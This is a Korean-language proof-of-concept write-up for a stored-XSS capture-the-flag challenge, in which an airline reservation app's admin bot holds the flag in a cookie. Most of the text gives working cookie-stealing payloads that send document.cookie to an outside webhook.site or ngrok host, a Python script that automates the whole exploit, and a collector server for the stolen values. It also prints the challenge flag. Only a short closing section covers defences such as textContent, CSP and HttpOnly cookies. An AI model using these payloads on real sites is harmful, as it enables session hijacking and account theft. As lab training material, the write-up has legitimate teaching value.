# Proof of Concept - Airline Reservation XSS with Bot

## 취약점 개요

이 웹 애플리케이션은 **Stored XSS + Admin Bot** 취약점을 가지고 있습니다.

### 취약점 위치

1. **클라이언트 측 (`index.html`)**
   - `reservationAdd()` 함수에서 `innerHTML` 사용
   - 사용자 입력이 HTML 엔티티 인코딩 없이 DOM에 삽입

2. **서버 측 (`server.js`)**
   - 이름 필드에 대한 HTML 태그 필터링 부재
   - `/report` 엔드포인트를 통한 Admin Bot 기능

3. **Admin Bot**
   - Puppeteer를 사용하여 관리자 봇이 페이지 방문
   - 쿠키에 FLAG가 저장되어 있음: `flag=Whois2025{...}`

## Exploit 시나리오

1. 공격자가 XSS 페이로드를 포함한 예약을 생성
2. `/report` 기능을 통해 Admin Bot이 해당 페이지 방문
3. XSS가 실행되어 Bot의 쿠키(FLAG 포함)를 탈취
4. 외부 서버로 FLAG 전송

## Exploit 방법

### Step 1: Webhook 준비

공격자 서버를 준비합니다. 테스트용으로는 다음을 사용할 수 있습니다:
- [Webhook.site](https://webhook.site)
- [RequestBin](https://requestbin.com)
- ngrok + 로컬 서버

예: `https://webhook.site/your-unique-id`

### Step 2: XSS 페이로드 작성

쿠키를 탈취하는 페이로드:

```html
<img src=x onerror="fetch('https://webhook.site/your-unique-id?flag='+document.cookie)">
```

또는 더 간단하게:

```html
<script>
fetch('https://webhook.site/your-unique-id?flag='+document.cookie)
</script>
```

인메모리 접근이용 가능!

이외 다양한 tag 사용가능!

### Step 3: 예약 생성

1. 웹사이트 접속: `http://localhost:8000`
2. 탑승객 이름에 위 페이로드 입력
3. 좌석: `7B`
4. "예약하기" 클릭

### Step 4: Admin Bot 트리거

1. "관리자에게 신고" 섹션으로 이동
2. 확인할 페이지 경로: `index.html`
3. "관리자에게 신고" 버튼 클릭
4. Admin Bot이 페이지를 방문하고 XSS 실행
5. Webhook에서 FLAG 확인

## 상세 Exploit 예시

### 방법 1: fetch를 이용한 쿠키 탈취

**페이로드:**
```html
<img src=x onerror="fetch('https://webhook.site/YOUR_ID?c='+document.cookie)">
```

**실행:**
1. 이름: 위 페이로드
2. 좌석: 7B
3. 예약 생성
4. 신고 경로: `index.html`
5. 신고 버튼 클릭

**결과:**
Webhook에 다음과 같은 요청이 도착:
```
GET /?c=flag=Whois2025{XSS_1n_A1rl1n3_R3s3rv4t10n_Syst3m_2025}
```

### 방법 2: XMLHttpRequest 사용

**페이로드:**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://webhook.site/YOUR_ID?flag=' + document.cookie);
xhr.send();
</script>
```

### 방법 3: Image 태그 활용

**페이로드:**
```html
<img src=x onerror="this.src='https://webhook.site/YOUR_ID?flag='+document.cookie">
```

### 방법 4: 여러 쿠키 탈취 (Base64 인코딩)

**페이로드:**
```html
<script>
fetch('https://webhook.site/YOUR_ID', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        cookie: document.cookie,
        url: location.href,
        timestamp: new Date().toISOString()
    })
});
</script>
```

## 자동화 스크립트

### Python 스크립트 전체 Exploit

```python
import requests
import time

TARGET = "http://localhost:8000"
WEBHOOK = "https://webhook.site/YOUR_ID"

# Step 1: XSS 페이로드 생성
payload = f'<img src=x onerror="fetch(\'{WEBHOOK}?flag=\'+document.cookie)">'

print("[*] Creating malicious reservation...")
res = requests.post(f"{TARGET}/api/reservations", json={
    "name": payload,
    "seat": "7B"
})
print(f"[+] Reservation created: {res.json()}")

# Step 2: Admin Bot 트리거
time.sleep(1)
print("\n[*] Triggering admin bot...")
res = requests.get(f"{TARGET}/report?path=index.html")
print(f"[+] Bot triggered: {res.text}")

print("\n[+] Check your webhook for the FLAG!")
print(f"[+] Webhook URL: {WEBHOOK}")
```

## 로컬 테스트 (ngrok 사용)

### 1. ngrok 설정

```bash
# 로컬 서버 실행
python3 -m http.server 9999

# 다른 터미널에서 ngrok 실행
ngrok http 9999
```

ngrok URL 복사: `https://xxxx.ngrok.io`

### 2. 로그 수집 서버 (Python)

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        
        print("\n" + "="*50)
        print("[+] Received request!")
        print(f"[+] Path: {self.path}")
        print(f"[+] Query: {query}")
        if 'flag' in params:
            print(f"[FLAG] {params['flag'][0]}")
        print("="*50 + "\n")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

HTTPServer(('', 9999), Handler).serve_forever()
```

### 3. Exploit 실행

페이로드에 ngrok URL 사용:
```html
<img src=x onerror="fetch('https://xxxx.ngrok.io?flag='+document.cookie)">
```

## 디버깅 팁

### 브라우저 콘솔에서 테스트

1. 예약 생성 후 브라우저에서 `F12` 열기
2. 콘솔에서 실행:
```javascript
console.log(document.cookie);
```

3. Admin Bot이 방문했을 때 쿠키 확인:
```javascript
fetch('/report?path=index.html')
    .then(r => console.log(r));
```

### Puppeteer 디버그 모드

`server.js` 수정:
```javascript
const browser = await puppeteer.launch({ 
    headless: false,  // 브라우저 표시
    devtools: true,   // 개발자 도구 열기
    ...
});
```

## FLAG

성공적으로 exploit하면 다음 FLAG를 얻을 수 있습니다:

```
Whois2025{XSS_1n_A1rl1n3_R3s3rv4t10n_Syst3m_2025}
```

## 방어 방법

### 1. 입력 검증 (서버)

```javascript
const sanitizedName = name.replace(/[<>'"]/g, '');
```

### 2. 출력 인코딩 (클라이언트)

```javascript
// innerHTML 대신 textContent 사용
const td = document.createElement('td');
td.textContent = row.name;
dataRow.appendChild(td);
```

### 3. CSP 헤더

```javascript
app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", 
        "default-src 'self'; script-src 'self'");
    next();
});
```

### 4. HttpOnly 쿠키

```javascript
await page.setCookie({
    name: 'flag',
    value: FLAG,
    httpOnly: true,  // JavaScript 접근 차단
    ...
});
```

## 참고 자료

- [OWASP XSS with Bot](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger - Exploiting XSS to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting)
- [HackTricks - XSS Cheat Sheet](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
